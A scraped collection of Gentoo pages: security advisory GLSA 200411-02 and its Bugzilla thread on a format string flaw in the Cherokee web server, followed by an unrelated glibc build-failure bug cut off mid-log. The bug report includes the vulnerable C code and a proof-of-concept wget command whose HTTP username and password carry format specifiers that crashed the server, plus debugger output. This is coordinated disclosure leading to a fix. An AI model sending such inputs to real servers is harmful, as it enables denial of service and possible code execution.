=== Content from www.gentoo.org_8be0997f_20250125_201517.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Cherokee: Format string vulnerability — GLSA **200411-02**

Cherokee contains a format string vulnerability that could lead to denial
of service or the execution of arbitary code.

### Affected packages

| Package | **www-servers/cherokee** on all architectures |
| --- | --- |
| Affected versions | <= **0.4.17** |
| Unaffected versions | >= **0.4.17.1** |

### Background

Cherokee is an extra-light web server.

### Description

Florian Schilhabel from the Gentoo Linux Security Audit Team found a
format string vulnerability in the cherokee\_logger\_ncsa\_write\_string()
function.

### Impact

Using a specially crafted URL when authenticating via auth\_pam, a
malicious user may be able to crash the server or execute arbitrary
code on the target machine with permissions of the user running
Cherokee.

### Workaround

There is no known workaround at this time.

### Resolution

All Cherokee users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/cherokee-0.4.17.1"
```
### References

* [CVE-2004-1097](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1097)

**Release date**

November 01, 2004

**Latest revision**

May 22, 2006: 02

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [67667](https://bugs.gentoo.org/show_bug.cgi?id=67667)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from bugs.gentoo.org_bf5286f2_20250125_201515.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 67667
www-servers/cherokee: remote Format String Vulnerability
Last modified: 2004-11-04 14:26:28 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=67667&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=67667&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 67667**](show_bug.cgi?id=67667)
- www-servers/cherokee: remote Format String Vulnerability

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
www-servers/cherokee: remote Format String Vulnerability

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All All | |  | | | [Importance](page.cgi?id=fields.html#importance): | High major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <http://www.alobbs.com/cherokee> | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | B1 [glsa] jaervosz | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2004-10-15 08:02 UTC by Florian Schilhabel (RETIRED) | | --- | --- | | Modified: | 2004-11-04 14:26 UTC ([History](show_activity.cgi?id=67667)) | | CC List: | 1 user (show)  stuart | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=67667&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=67667&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Florian Schilhabel (RETIRED)   gentoo-dev  2004-10-15 08:02:05 UTC  ``` hi, i have found a remote exploitable formatstring bug in the Webserver cherokee-0.4.17.  the affected function is located in logger_ncsa.c:  cherokee_logger_ncsa_write_string():  ret_t  cherokee_logger_ncsa_write_string (cherokee_logger_ncsa_t *logger, const char *string) { 	if (logger->accesslog_fd != NULL) { 		int ret; 		ret = fprintf (logger->accesslog_fd, string);  		return (ret > 0) ? ret_ok : ret_error; 	}   	syslog (LOG_INFO, "%s", string); 	return ret_ok; }  this function is called, if a users authenticates to the server with username plus password (via auth_pam) in validator_pass.c:  --- snip --- ret_t  cherokee_validator_pam_check (cherokee_validator_pam_t  *pam, cherokee_connection_t *conn) { ... 	/* Try to authenticate user: 	 */ 	ret = _pam_dispatch (pamhandle, 0, 1); 	if (ret != PAM_SUCCESS) { 		cherokee_logger_write_string ( 			CONN_VSRV(conn)->logger, 			"PAM: user '%s' - not authenticated: %s",  			conn->user->buf, pam_strerror(pamhandle, ret));  		goto unauthorized; 	} ... --- snip ---  demonstration:  client: bash-2.05b$ wget --http-user=%s%s%s%s%s%s%s%x%s%s%s%s%s%s%s%x%s%s%s%s%s%s%s%x --http-passwd=%n%n%x <http://127.0.0.1/private/index.html> --01:12:39--  <http://127.0.0.1/private/index.html>            => `index.html' Connecting to 127.0.0.1:80... connected. HTTP request sent, awaiting response... End of file while parsing headers. Retrying.  --01:12:41--  <http://127.0.0.1/private/index.html>   (try: 2) => `index.html' Connecting to 127.0.0.1:80... failed: Connection refused. bash-2.05b$  server:  bender root # cherokee -C /etc/cherokee/cherokee.conf PHP interpreter not found (/usr/lib/cgi-bin/php4). Please install it. Cherokee Web Server 0.4.17: Listening on port 80, using poll, 1024 fds limit 5 threads, 204 fds in each, standard scheduling policy, TLS disabled Cherokee feels panic! Killed bender root #   server log: you can find very interesting data in /var/log/cherokee.access:  PAM: user '(null)0ö0öPAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication module0ö$ìPAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication modulePAM: user '%s' - not authenticated: %s ```  [Comment 1](#c1)  Florian Schilhabel (RETIRED)   gentoo-dev  2004-10-15 08:02:05 UTC  ``` hi, i have found a remote exploitable formatstring bug in the Webserver cherokee-0.4.17.  the affected function is located in logger_ncsa.c:  cherokee_logger_ncsa_write_string():  ret_t  cherokee_logger_ncsa_write_string (cherokee_logger_ncsa_t *logger, const char *string) { 	if (logger->accesslog_fd != NULL) { 		int ret; 		ret = fprintf (logger->accesslog_fd, string);  		return (ret > 0) ? ret_ok : ret_error; 	}   	syslog (LOG_INFO, "%s", string); 	return ret_ok; }  this function is called, if a users authenticates to the server with username plus password (via auth_pam) in validator_pass.c:  --- snip --- ret_t  cherokee_validator_pam_check (cherokee_validator_pam_t  *pam, cherokee_connection_t *conn) { ... 	/* Try to authenticate user: 	 */ 	ret = _pam_dispatch (pamhandle, 0, 1); 	if (ret != PAM_SUCCESS) { 		cherokee_logger_write_string ( 			CONN_VSRV(conn)->logger, 			"PAM: user '%s' - not authenticated: %s",  			conn->user->buf, pam_strerror(pamhandle, ret));  		goto unauthorized; 	} ... --- snip ---  demonstration:  client: bash-2.05b$ wget --http-user=%s%s%s%s%s%s%s%x%s%s%s%s%s%s%s%x%s%s%s%s%s%s%s%x --http-passwd=%n%n%x <http://127.0.0.1/private/index.html> --01:12:39--  <http://127.0.0.1/private/index.html>            => `index.html' Connecting to 127.0.0.1:80... connected. HTTP request sent, awaiting response... End of file while parsing headers. Retrying.  --01:12:41--  <http://127.0.0.1/private/index.html>   (try: 2) => `index.html' Connecting to 127.0.0.1:80... failed: Connection refused. bash-2.05b$  server:  bender root # cherokee -C /etc/cherokee/cherokee.conf PHP interpreter not found (/usr/lib/cgi-bin/php4). Please install it. Cherokee Web Server 0.4.17: Listening on port 80, using poll, 1024 fds limit 5 threads, 204 fds in each, standard scheduling policy, TLS disabled Cherokee feels panic! Killed bender root #   server log: you can find very interesting data in /var/log/cherokee.access:  PAM: user '(null)0Ã¶0Ã¶PAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication module0Ã¶$Ã¬PAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication modulePAM: user '%s' - not authenticated: %sÂ  1@Ã¬d@$G@Ã&#155;/@$G@Â°.@Â°XPAM: user '(null)0Ã¶0Ã¶PAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication module0Ã¶$Ã¬PAM: user '%s%s%s%s%s%s%s%s%s%s%s' - not authenticated: User not known to the underlying authentication modulePAM: user '%s' - not authenticated: %sÂ  1@Ã¬d@$G@Ã&#155;/@$G@Â Â°.@Â¨X  to be clear: the syslog() fkt is porperly protected - it happens one before...  debugger attached to server:  Attaching to program: /usr/sbin/cherokee, process 23158 Reading symbols from /usr/lib/libcherokee.so.0...done. Loaded symbols for /usr/lib/libcherokee.so.0 Reading symbols from /lib/libpthread.so.0...done. [Thread debugging using libthread_db enabled] [New Thread 16384 (LWP 23158)] [New Thread 32769 (LWP 23159)] [New Thread 16386 (LWP 23160)] [New Thread 32771 (LWP 23161)] [New Thread 49156 (LWP 23162)] [New Thread 65541 (LWP 23163)] Loaded symbols for /lib/libpthread.so.0 Reading symbols from /lib/libdl.so.2...done. Loaded symbols for /lib/libdl.so.2 Reading symbols from /lib/libc.so.6...done.  [more symbols]  Reading symbols from /usr/lib/cherokee/libcherokee_plain.so...done. Loaded symbols for /usr/lib/cherokee/libcherokee_plain.so 0x40165a11 in loser_poll () from /lib/libc.so.6 (gdb) step Single stepping until exit from function loser_poll, which has no line number information. [Switching to Thread 16384 (LWP 23158)] 0x40165aca in poll () from /lib/libc.so.6 (gdb) step Single stepping until exit from function poll, which has no line number information.  Program received signal SIGSEGV, Segmentation fault. [Switching to Thread 65541 (LWP 23163)] 0x4011f753 in strlen () from /lib/libc.so.6 (gdb) backtrace #0  0x4011f753 in strlen () from /lib/libc.so.6 #1  0x400f6d29 in vfprintf () from /lib/libc.so.6 #2  0x400fcfef in fprintf () from /lib/libc.so.6 #3  0x4030292d in cherokee_logger_ncsa_write_string (logger=0x3a4d4150,     string=0x267a <Address 0x267a out of bounds>) at logger_ncsa.c:295 #4  0x4003e7c8 in cherokee_logger_write_string (logger=0x806e150,     format=0x3a4d4150 <Address 0x3a4d4150 out of bounds>) at logger.c:156 #5  0x402fdd55 in cherokee_validator_pam_check (pam=0x807ef10, conn=0x807e780) at validator_pam.c:180 #6  0x40042eb0 in cherokee_validator_check (validator=0x0, conn=0x3a4d4150) at validator.c:63 #7  0x40039d44 in cherokee_connection_check_authentication (cnt=0x807e780, plugin_entry=0x806ef18)     at connection.c:1296 #8  0x4003f171 in process_active_connections (thd=0x807d090) at thread.c:460 #9  0x4003fce8 in cherokee_thread_step_MULTI_THREAD (thd=0x807d090, dont_block=false) at thread.c:1096 #10 0x4003eb84 in thread_routine (data=0x807d090) at thread.c:73 #11 0x4006b01f in pthread_start_thread () from /lib/libpthread.so.0 #12 0x4016ee6a in clone () from /lib/libc.so.6 (gdb)  another impact:  client: wget [http://127.0.0.1/%s%s%s%s%s%s%s%s%s%s%s%s%s](http://127.0.0.1/%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s)% [+x] %s  serverlog: 127.0.0.1 - - [15/Oct/2004:01:30:58 +0100] "GET /%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s$G@pP]Ã¨@P`,ÃºÂ¿$G@`PXÂ¤@P`$G@Ã&#138;Ã­@``DÃºÂ¿$G@$G@`Ã¯@`xÃºÂ¿ Â«@Ã§Â´Â´â&#150;&#146;Â©$G@PÃ§Ã¨Ã¼Â°Ã§$G@Ã&#140;Ã»Â¿Ã«@u@;@Ã Ã»Â¿;@Ã Ã»Â¿Â°@Ã¸Ã¼Â¿Â¯@jÃ®@Ã Ã»Â¿ Â¤@(@(@ Â¤Ã¸Ã¿Â¿@Âµ@ Â¤@â&#150;&#146;Ã¸Ã¿Â¿$G@Ã&#152;Ã&#140;P(Â¨@Ã¬ Â¤@u@Ã&#128;Ã&#128;'Ã&#128;!Ã½Â¿aÂ¤Ã½Â¿Â¬Ã½Â¿Ã¿Â¿ÂªÃ&#128;@0Â¤@  we're basically hitting the stack here... we can do everything, send shellcde, write .dtors, etc...  Impact:    -> a succesful exploitation of this bug leads to execution of arbitrary code (with server rights, of course) -> in case of unsuccessful exploitation, this leads to a denial of service.  i think, this bug should be fixed upstream, therefore i have not attached a patch for this issue. author has _not_ yet been informed about this bug.  best regards  florian [rootshell] ```  [Comment 2](#c2)  Thierry Carrez (RETIRED)   gentoo-dev  2004-10-20 01:10:42 UTC  ``` Audit team, please peer-review this one before we take it to upstream and/or vendor-sec. ```  [Comment 3](#c3)  Dan Margolis (RETIRED)   gentoo-dev  2004-10-26 14:47:26 UTC  ``` This is confirmed. Easy DoS, potential code execution (I'll have to spend more time on that part; I haven't managed RCE yet).   Time to contact the Cherokee dev team and possibly forward to vendor-sec. I'm writing to them now.   Thanks, rootshell. ```  [Comment 4](#c4)  Thierry Carrez (RETIRED)   gentoo-dev  2004-10-27 01:14:50 UTC  ``` Krispy: don't forget to credit Florian if you write directly upstream. Maybe it's best if he writes to them himself.  klieber/solar: do you think this one needs to be coordinated with vendor-sec ? Who ships cherokee ? ```  [Comment 5](#c5)  Florian Schilhabel (RETIRED)   gentoo-dev  2004-10-30 07:43:34 UTC  ``` hi, i just got this email (as CC) from chreokee maintainer:  -- mail --  Hi Dan,    First of all, thank you very much for the report :-)     There are two patched versions that correct this bug:    - The 0.4.17.1: It is the fixed 0.4.17:      ftp://alobbs.com/cherokee/0.4/0.4.17/cherokee-0.4.17.1.tar.gz    - The 0.4.18b25: It is a beta of the incoming release of     Cherokee. It contains new features, but of are unfinished yet:      <http://alobbs.com/tmp/cherokee-0.4.18b25.tar.gz>  -- eof --  so please bump up to version 0.4.17.1 save to go public now...  best regards  florian [rootshell]  ```  [Comment 6](#c6)  Florian Schilhabel (RETIRED)   gentoo-dev  2004-10-30 07:48:15 UTC  ``` this is the debian maintainer, btw:  <http://people.debian.org/~rcardenes/#cherokee>  seems, that other distributions do _not_ ship cherokee by default... (at least i cant find 'official' rpms)  best regards  florian [rootshell]  ```  [Comment 7](#c7)  Sune Kloppenborg Jeppesen (RETIRED)   gentoo-dev  2004-10-30 08:35:18 UTC  ``` Stuart please provide an updated ebuild or CC the right dev as this is not a public bug. ```  [Comment 8](#c8)  Stuart Herbert (RETIRED)   gentoo-dev  2004-10-30 10:12:36 UTC  ``` Updated ebuild committed, and marked stable on x86.  Just needs marking stable on ppc now. ```  [Comment 9](#c9)  Sune Kloppenborg Jeppesen (RETIRED)   gentoo-dev  2004-10-30 13:49:44 UTC  ``` CC'ing pvdabeel instead of ppc as this bug is not public.  Pieter please test and mark 0.4.17.1 stable. ```  [Comment 10](#c10)  Thierry Carrez (RETIRED)   gentoo-dev  2004-11-01 02:16:18 UTC  ``` This is public now (see <http://alobbs.com/>) ppc: please mark stable. ```  [Comment 11](#c11)  Michael Hanselmann (hansmi) (RETIRED)   gentoo-dev  2004-11-01 02:34:22 UTC  ``` Stable on ppc. ```  [Comment 12](#c12)  Sune Kloppenborg Jeppesen (RETIRED)   gentoo-dev  2004-11-01 10:16:43 UTC  ``` GLSA 200411-02 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=67667)
* - [XML](show_bug.cgi?ctype=xml&id=67667)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=67667)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=67667&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=67667&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=67667&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.gentoo.org_047c52bf_20250126_113924.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 6766
GCC 3.2 and GLIBC r7 problem
Last modified: 2003-02-04 19:42:18 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=6766&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=6766&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 6766**](show_bug.cgi?id=6766)
- GCC 3.2 and GLIBC r7 problem

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
GCC 3.2 and GLIBC r7 problem

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | [OLD] Core system ([show other bugs](buglist.cgi?component=%5BOLD%5D%20Core%20system&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | x86 Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Lowest blocker | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Martin Schlemmer (RETIRED) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2002-08-20 06:21 UTC by Maurizio Disimino | | --- | --- | | Modified: | 2003-02-04 19:42 UTC ([History](show_activity.cgi?id=6766)) | | CC List: | 2 users (show)  mholzer rigo | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Output glibc**](attachment.cgi?id=3281 "View the content of the attachment") (glibc.out.gz,148.60 KB, application/gzip)  [2002-08-21 16:22 UTC](#attach_3281 "Go to the comment associated with the attachment"), Rigo | [Details](attachment.cgi?id=3281&action=edit) | | [View All](attachment.cgi?bugid=6766&action=viewall)  [Add an attachment](attachment.cgi?bugid=6766&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=6766&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Maurizio Disimino    2002-08-20 06:21:20 UTC  ``` '-I../include -I.. -I/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere -I../sysdeps/i386/elf -I../linuxthreads/sysdeps/unix/sysv/linux/i386 -I../linuxthreads/sysdeps/unix/sysv/linux -I../linuxthreads/sysdeps/pthread -I../sysdeps/pthread -I../linuxthreads/sysdeps/unix/sysv -I../linuxthreads/sysdeps/unix -I../linuxthreads/sysdeps/i386/i686 -I../linuxthreads/sysdeps/i386 -I../sysdeps/unix/sysv/linux/i386/i686 -I../sysdeps/unix/sysv/linux/i386 -I../sysdeps/unix/sysv/linux -I../sysdeps/gnu -I../sysdeps/unix/common -I../sysdeps/unix/mman -I../sysdeps/unix/inet -I../sysdeps/unix/sysv/i386 -I../sysdeps/unix/sysv -I../sysdeps/unix/i386 -I../sysdeps/unix -I../sysdeps/posix -I../sysdeps/i386/i686/fpu -I../sysdeps/i386/i686 -I../sysdeps/i386/i486 -I../sysdeps/i386/fpu -I../sysdeps/i386 -I../sysdeps/wordsize-32 -I../sysdeps/ieee754/ldbl-96 -I../sysdeps/ieee754/dbl-64 -I../sysdeps/ieee754/flt-32 -I../sysdeps/ieee754 -I../sysdeps/generic/elf -I../sysdeps/generic ' > /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/isomac.out make[2]: *** [/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/isomac.out] Error 139 make[2]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/stdlib' make[1]: *** [stdlib/tests] Error 2 make[1]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5' make: *** [check] Error 2  /usr/portage/sys-libs/glibc/glibc-2.2.5-r7.ebuild: src_compile failed; exiting.  portage .29 - gcc 3.2 - gentoo 1.4beta  MAKEOPTS="-j1" doesn't work.  CPU: duron 700 - standard gcc flags ```  [Comment 1](#c1)  Rigo    2002-08-20 06:29:38 UTC  ``` Same situation...Different output:  gcc -nostdlib -nostartfiles -o /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/test-float  -Wl,-dynamic-linker=/lib/ld-linux.so.2   -Wl,-z,combreloc /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crt1.o /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crti.o `gcc --print-file-name=crtbegin.o` /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/test-float.o /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/libm.so.6  -Wl,-rpath-link=/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/dlfcn:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nss:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nis:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/rt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/resolv:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/crypt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/linuxthreads /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/libc.so.6 /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/libc_nonshared.a -lgcc `gcc --print-file-name=crtend.o` /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crtn.o GCONV_PATH=/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/iconvdata LC_ALL=C   /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf/ld-linux.so.2 --library-path 